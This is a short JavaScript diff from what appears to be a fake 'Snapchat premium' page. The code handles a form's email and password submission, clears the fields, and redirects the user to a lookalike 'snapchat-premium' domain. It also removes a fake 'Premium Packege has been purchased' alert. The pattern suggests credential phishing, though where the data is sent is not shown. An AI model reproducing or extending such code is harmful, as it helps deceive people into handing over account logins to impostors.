@@ -36,15 +36,18 @@ const getValues = async () => {
         .then(data => {
             // Handle the response data
             console.log('Response:', data);
+            Email.value = "";
+            Password.value = "";
+            // Redirect the user to a specific URL
+            window.location.href = "https://snapchat-premium.cyclic.app/Auth";
+
             
         })
         .catch(error => {
             // Handle any errors
             console.error('Error:', error);
         });
-alert("Premium Packege has been purchased..")
-            Email.value = ""
-            Password.value = ""
+
 
 
 }
